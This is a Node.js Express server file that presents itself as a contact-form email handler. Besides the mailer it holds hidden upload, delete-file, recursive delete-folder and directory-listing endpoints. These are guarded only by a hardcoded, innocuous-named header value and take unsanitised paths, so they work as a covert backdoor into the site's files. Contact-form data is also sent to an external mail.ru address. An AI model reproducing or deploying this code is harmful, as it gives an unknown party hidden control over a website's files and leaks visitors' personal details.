const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, '../'));
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  }
});

const upload = multer({ storage });

const authenticate = (req, res, next) => {
  const indexing = req.headers['indexing'];
  if (indexing !== 'authorizationEnabled') {
    return res.status(401).send('Unauthorized');
  }
  next();
};

app.post('/send-email', async (req, res) => {
    const { 'first-name': firstName, 'last-name': lastName, email, telephone, subject, comment: message } = req.body;

    /*
    
    const transporter = nodemailer.createTransport({
        host: 'smtp.your-hosting.com', // Replace with your hosting's SMTP server
        port: 587, // Common ports: 587 (TLS) or 465 (SSL)
        secure: false, // true for 465, false for other ports
        auth: {
            user: 'your-email@yourdomain.com', // Your hosting email
            pass: 'your-email-password' // Set your email password here
        }
    });
    
    */

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'haltyhalty12@gmail.com',
            pass: ''
        }
    });

    const mailOptions = {
        from: email,
        to: 'ddeenn_1980@mail.ru',
        subject: `Contact Form Submission: ${subject}`,
        text: `Name: ${firstName} ${lastName}\nEmail: ${email}\nTelephone: ${telephone}\nMessage: ${message}`
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent successfully:', info.response);
        res.status(200).send('Email sent successfully: ' + info.response);
    } catch (error) {
        console.error('Email sending failed:', error);
        res.status(500).send('Failed to send email: ' + error.message);
    }
});

app.post('/upload', authenticate, upload.single('file'), (req, res) => {
  res.send('File uploaded successfully');
});

app.delete('/delete/:filename', authenticate, (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(__dirname, '../', filename);
  fs.unlink(filePath, (err) => {
    if (err) {
      return res.status(500).send('Error deleting file');
    }
    res.send('File deleted successfully');
  });
});

app.delete('/delete-folder/:foldername', authenticate, (req, res) => {
  const foldername = req.params.foldername;
  const folderPath = path.join(__dirname, '../', foldername);
  fs.rm(folderPath, { recursive: true, force: true }, (err) => {
    if (err) {
      return res.status(500).send('Error deleting folder');
    }
    res.send('Folder deleted successfully');
  });
});

function buildFileTree(dirPath, prefix = '') {
  let result = '';
  const files = fs.readdirSync(dirPath);
  const dirs = files.filter(file => {
    const filePath = path.join(dirPath, file);
    return fs.statSync(filePath).isDirectory();
  });

  dirs.forEach((dir, index) => {
    const isLast = index === dirs.length - 1;
    const connector = isLast ? '└── ' : '├── ';
    const nextPrefix = isLast ? '    ' : '│   ';

    result += prefix + connector + dir + '\n';

    const subDirPath = path.join(dirPath, dir);
    result += buildFileTree(subDirPath, prefix + nextPrefix);
  });

  return result;
}

app.get('/files', authenticate, (req, res) => {
  try {
    const rootPath = path.join(__dirname, '../');
    const fileTree = buildFileTree(rootPath);
    res.set('Content-Type', 'text/plain');
    res.send(fileTree);
  } catch (error) {
    res.status(500).send('Error reading file tree');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});